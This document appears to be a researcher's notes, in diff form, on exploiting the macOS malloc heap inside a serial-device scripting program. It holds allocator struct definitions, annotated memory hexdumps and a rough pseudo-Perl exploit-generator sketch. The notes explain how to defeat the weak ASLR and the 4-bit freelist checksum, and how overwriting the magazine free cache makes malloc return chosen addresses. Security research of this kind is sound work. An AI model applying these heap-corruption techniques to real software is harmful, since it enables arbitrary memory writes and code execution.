+/****************************** zone itself ***********************************/
+
+/*
+ * Note that objects whose adddress are held in pointers here must be pursued
+ * individually in the {tiny,small}_in_use_enumeration() routines. See for
+ * example the treatment of region_hash_generation and tiny_magazines below.
+ */
+
+typedef struct szone_s {	  // vm_allocate()'d, so page-aligned to begin with.
+	malloc_zone_t basic_zone; // first page will be given read-only protection
+	uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];
+
+	unsigned long cpu_id_key; // unused
+	// remainder of structure is R/W (contains no function pointers)
+	unsigned debug_flags;
+	void *log_address;
+
+	/* Regions for tiny objects */
+	_malloc_lock_s tiny_regions_lock MALLOC_CACHE_ALIGN;
+	size_t num_tiny_regions;
+	size_t num_tiny_regions_dealloc;
+	region_hash_generation_t *tiny_region_generation;
+	region_hash_generation_t trg[2];
+
+	int num_tiny_magazines;
+	unsigned num_tiny_magazines_mask;
+	int num_tiny_magazines_mask_shift;
+	magazine_t *tiny_magazines; // array of per-processor magazines
+
+	uintptr_t last_tiny_advise;
+
+	/* Regions for small objects */
+	_malloc_lock_s small_regions_lock MALLOC_CACHE_ALIGN;
+	size_t num_small_regions;
+	size_t num_small_regions_dealloc;
+	region_hash_generation_t *small_region_generation;
+	region_hash_generation_t srg[2];
+
+	unsigned num_small_slots; // determined by physmem size
+
+	int num_small_magazines;
+	unsigned num_small_magazines_mask;
+	int num_small_magazines_mask_shift;
+	magazine_t *small_magazines; // array of per-processor magazines
+
+	uintptr_t last_small_advise;
+
+	/* large objects: all the rest */
+	_malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large
+	unsigned num_large_objects_in_use;
+	unsigned num_large_entries;
+	large_entry_t *large_entries; // hashed by location; null entries don't count
+	size_t num_bytes_in_large_objects;
+
+#if CONFIG_LARGE_CACHE
+	int large_entry_cache_oldest;
+	int large_entry_cache_newest;
+	large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // "death row" for large malloc/free
+	boolean_t large_legacy_reset_mprotect;
+	size_t large_entry_cache_reserve_bytes;
+	size_t large_entry_cache_reserve_limit;
+	size_t large_entry_cache_bytes; // total size of death row, bytes
+#endif
+
+	/* flag and limits pertaining to altered malloc behavior for systems with
+	 * large amounts of physical memory */
+	unsigned is_largemem;
+	unsigned large_threshold;
+	unsigned vm_copy_threshold;
+
+	/* security cookie */
+	uintptr_t cookie;
+
+	/* Initial region list */
+	region_t initial_tiny_regions[INITIAL_NUM_REGIONS];
+	region_t initial_small_regions[INITIAL_NUM_REGIONS];
+
+	/* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small
+	 * allocations to the default scalable zone. Record the latter as the "helper" zone here. */
+	struct szone_s *helper_zone;
+
+	boolean_t flotsam_enabled;
+} szone_t;
+
+===========================
+
+I started at the beginning with the malloc_info structure containing the heap function pointers. 
+
+=========================
+typedef struct _malloc_zone_t {
+    /* Only zone implementors should depend on the layout of this structure;
+    Regular callers should use the access functions below */
+    void	*reserved1;	/* RESERVED FOR CFAllocator DO NOT USE */
+    void	*reserved2;	/* RESERVED FOR CFAllocator DO NOT USE */
+    size_t 	(*size)(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */
+    void 	*(*malloc)(struct _malloc_zone_t *zone, size_t size);
+    void 	*(*calloc)(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */
+    void 	*(*valloc)(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */
+    void 	(*free)(struct _malloc_zone_t *zone, void *ptr);
+    void 	*(*realloc)(struct _malloc_zone_t *zone, void *ptr, size_t size);
+    void 	(*destroy)(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */
+    const char	*zone_name;
+
+    /* Optional batch callbacks; these may be NULL */
+    unsigned	(*batch_malloc)(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */
+    void	(*batch_free)(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */
+
+    struct malloc_introspection_t	*introspect;
+    unsigned	version;
+    	
+    /* aligned memory allocation. The callback may be NULL. Present in version >= 5. */
+    void *(*memalign)(struct _malloc_zone_t *zone, size_t alignment, size_t size);
+    
+    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version >= 6.*/
+    void (*free_definite_size)(struct _malloc_zone_t *zone, void *ptr, size_t size);
+
+    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version >= 8. */
+    size_t 	(*pressure_relief)(struct _malloc_zone_t *zone, size_t goal);
+} malloc_zone_t;
+
+=========================
+
+Here is a hexdump from memory.
+
+========================
+/* PN: Function pointers to malloc, free, realloc, madvise, etc… not in that order */
+
+0x10009e000:    0x0000000000000000 
+		0x0000000000000000
+0x10009e010:    0x00007fff939dffe7 
+		0x00007fff939de2da
+0x10009e020:    0x00007fff939e047d 
+		0x00007fff939e29d2
+0x10009e030:    0x00007fff939e1d73 
+		0x00007fff939e1179
+0x10009e040:    0x00007fff939ec231 
+		0x0000000100100000
+0x10009e050:    0x00007fff939e4e73 
+		0x00007fff939eaf6b
+0x10009e060:    0x00007fff9c7633b0 
+		0x0000000000000009
+0x10009e070:    0x00007fff939e200e 
+		0x00007fff939e030c
+0x10009e080:    0x00007fff939eb26a 
+		0x0000000000000000
+
+=======================
+
+Unfortunately Apple has made those read only. Then I moved down the structure to magazine_t structures. Most of the allocations in the program are in the tiny region, so I poked around in those magazines the most. 
+
+=================
+
+typedef struct magazine_s { // vm_allocate()'d, so the array of magazines is page-aligned to begin with.
+	// Take magazine_lock first,  Depot lock when needed for recirc, then szone->{tiny,small}_regions_lock when needed for alloc
+	_malloc_lock_s magazine_lock MALLOC_CACHE_ALIGN; /* PN: Had bad luck playing with this *
+	// Protection for the crtical section that does allocate_pages outside the magazine_lock
+	volatile boolean_t alloc_underway; /* PN: Couldn’t really find this */
+
+/* PN: This holds the magazines “cache”. The last allocation which has been freed
+     This would be used for programs which rapidly free and unfree same sized objects
+     Just like our application ;-)  */
+	// One element deep "death row", optimizes malloc/free/malloc for identical size.
+	void *mag_last_free;		// low SHIFT_{TINY,SMALL}_QUANTUM bits indicate the msize
+	region_t mag_last_free_rgn; // holds the region for mag_last_free /* PN: This is the region last free was in */
+
+/* PN: This is the start of an array of freelists sorted by allocation size.
+    So all allocations of size 32 will be located in the freelist at mag_free_list[2]
+    Because 2*16 = 32. mag_free_list[3] for sizes 16*3, etc. up to 16*256 */
+	free_list_t mag_free_list[256]; // assert( 256 >= MAX( NUM_TINY_SLOTS, NUM_SMALL_SLOTS_LARGEMEM ))
+/* PN: This is a bit map describing which chunks are in use. Each bit represents a 16 byte chunk and
+    Whether it’s allocated or not */
+	unsigned mag_bitmap[8];			 // assert( sizeof(mag_bitmap) << 3 >= sizeof(mag_free_list)/sizeof(free_list_t) )
+
+	// the first and last free region in the last block are treated as big blocks in use that are not accounted for
+	size_t mag_bytes_free_at_end; /* PN: These are used in sanity checks */
+	size_t mag_bytes_free_at_start; /* PN: Also can be coalesced with */
+	region_t mag_last_region; // Valid iff mag_bytes_free_at_end || mag_bytes_free_at_start > 0
+
+	// bean counting ...
+	unsigned mag_num_objects; /* PN: More sanity checks */
+	size_t mag_num_bytes_in_objects; /* PN: To detect if heap has been modified */
+	size_t num_bytes_in_magazine;
+
+	// recirculation list -- invariant: all regions owned by this magazine that meet the emptiness criteria
+	// are located nearer to the head of the list than any region that doesn't satisfy that criteria.
+	// Doubly linked list for efficient extraction.
+	unsigned recirculation_entries;
+	region_trailer_t *firstNode; /* PN: This is a linked list of each region used by this magazine */
+	region_trailer_t *lastNode;
+
+	uintptr_t pad[50 - MALLOC_CACHE_LINE / sizeof(uintptr_t)];
+} magazine_t;
+
+====================
+
+Here’s a hexdump of it from live memory
+
+=================
+
+0x10009f000:    0xffffffffffffffff // cpu id key
+		0x00000000
+                0x40000040 // debug flags
+0x10009f010:    0x0000000000000000 // log address
+		0x0000000000000000 
+0x10009f020:    0x0000000000000000 
+		0x0000000000000000
+0x10009f030:    0x0000000000000000 
+		0x0000000000000000
+0x10009f040:    0x0000000000000000  /* PN: Padding??? It’s the same size as the malloc function pointers */
+		0x0000000000000000
+0x10009f050:    0x0000000000000000 
+		0x0000000000000000
+0x10009f060:    0x0000000000000000 
+		0x0000000000000000
+0x10009f070:    0x0000000000000000 
+		0x0000000000000000
+0x10009f080:    0x0000000000000000 			// tiny region lock struct??
+
+		0x0000000000000002 			// num_tiny_regions
+0x10009f090:    0x0000000000000000 			// tiny_regions_dealloc
+
+		0x000000010009f0a0 			// tiny region generation
+0x10009f0a0:    0x0000000000000040 			// num_regions_allocated
+		0x0000000000000006 			// num_regions_allocated_shift
+0x10009f0b0:    0x000000010009f360 			// hashed_regions
+		0x000000010009f0c0 			// nextgen
+0x10009f0c0:    0x0000000000000000 			// num_regions_allocated
+		0x0000000000000000 			// num_regions_allocated_shift
+0x10009f0d0:    0x0000000000000000 			// hashed_regions
+		0x000000010009f0a0 			// nextgen
+
+0x10009f0e0:    0x00000001 				// num_tiny_mag
+                0x00000002 				// num_tiny_mags_mask
+	   	0x00000000				// num_tiny_mask_shift
+                0x00000001				// tiny mag mask shift
+0x10009f0f0:    0x00000001000a1a00 			// tiny magazine
+		0x0000000000000000 			// last_tiny_advice
+0x10009f100:    0x0000000000000000 
+
+		0x0000000000000002 			// num_small_regions
+0x10009f110:    0x0000000000000000  			// num_small regions_dealloc
+
+		0x000000010009f120 			// small_region_generation
+0x10009f120:    0x0000000000000040 			// num_regions_allocated
+		0x0000000000000006 			// num_regions_allocated_shift
+0x10009f130:    0x000000010009f560 			// hashed_region
+		0x000000010009f140 			// nextgen
+0x10009f140:    0x0000000000000000 			// num_regions_allocated
+		0x0000000000000000 			// num_regions_allocated_shift
+0x10009f150:    0x0000000000000000 			// hashed_region
+		0x000000010009f120 			// nextgen
+
+0x10009f160:    0x00000002 				// num_+small_slots
+                0x00000100  				// num_small mags
+		0x00000000 				// num_small_magazines_mask
+                0x00000001 				// num_small_magazines_mask_shift
+0x10009f170:    0x00000001000b8a00 			// small_magazines
+		0x0000000000000000 			// last_small_advice
+0x10009f180:    0x00000001
+                0x00000000 				// large_lock
+	        0x00000000 				// large entries in use
+                0x000000a9				// num_large_enteries
+0x10009f190:    0x00000001000fc000			// large_enteries
+		0x000000000002a000 			// num bytes in large object
+
+0x10009f1a0:    0x0000000000000000 
+		0x0000000000000000
+0x10009f1b0:    0x0000000000000000 
+		0x0000000000000000
+0x10009f1c0:    0x0000000000000000 
+		0x0000000000000000
+
+=================
+
+What made these interesting targets is that there’s barely any ASLR at all. The program will always have the same static offsets for szone_t and the magazines on every run. Unfortunately most of the double-linked lists use a crappy form on checksumming. A 4 bit checksum is included in the most significant byte of the pointers in freelists. That’s only 16 possible values though, so you could guess it 1/16th (7%) of the time. It’s created by xoring the address with the cookie value in szone_t and rotating the address to the right. Simply changing the cool value seems tempting, but I fear it’ll just cause every single allocation already made to become invalid. Might be some room for research here though, if you have knowledge of where the allocation is at, or if you can read the cookie. Inside the magazine there is a freelist cache item. It holds the previous free item for a particular quanta, for similar sized object which are quickly freed and reallocated. Overwriting this worked quite well and had malloc handing out any address I chose. But there appears to be some timing issues. The program runs in a loop taking events for read and write to serial devices. I will need to control those loops tightly. Any new primitives I can come up with would also be nice. Going to add a for loop primitive, and a list of other features like easier read primitive. Read primitives are tricky, I need a way to be able to read and write the same value. Since everything is based on line number. The exploit script generator has to layout different lines in the script to write or read different values based on it’s current line. Using a different state machine, such as the increments and decrements counting feature, it could be possible to make a prolog which decides if it’s reading or writing and to which address. These are very pseudo and meta instructions and gadgets. We’re using the values we can control to create different machines inside of the target application. And the payload language should be well done and easy to modify, e.g… We might even be able to use the accumulator (INCTRIES/DECTRIES/SETTRIES/IFTRIES) as a type of flag register. One bit can represent zero flag, one can represent overflow flag, maybe a reading or writing state flag
+
+Sub _setup {
+	clear_stack();
+	// We use the INCTRIES and IFTRIES commands to count the
+	//  number of loops
+	_for(jump($done), 50);
+		write32($SV->mag.free_list[$$x]+4, $payload_addr);
+	_done();
+	// SETTRIES 0 probably
+
+}
+
+Sub _cleanup {
+
+}
+
+Sub _for {
+	my $var = shift;
+	my $i = shift;
+	label($label_index++);
+	print “SETTRIES 0\n”;
+	label($label_index++);
+	print “INCTRIES\n”;
+	jump($$val);
+	print “IFTRIES $i $var”
+	jump($label_index-1);
+	label($label_index++);
+	ret();
+}
+
+Sub _loop {
+	_layout();
+	_build();
+	_link();
+	_run();
+
+}
+
+Also I have 16 lines between each write because min size of allocations is 16
+
+To test and debug the exploit I also designed a python lldb script which is included. It’s basic goal is to track usage of every allocation and better predict which values to alter to achieve my exploitation. This really just speeds things up for me, since I don’t need to keep clicking on the start button and writing down the values every time. Altering one value slightly, trying again, altering it again, plus another…. Ugghhh… That’s all this does.
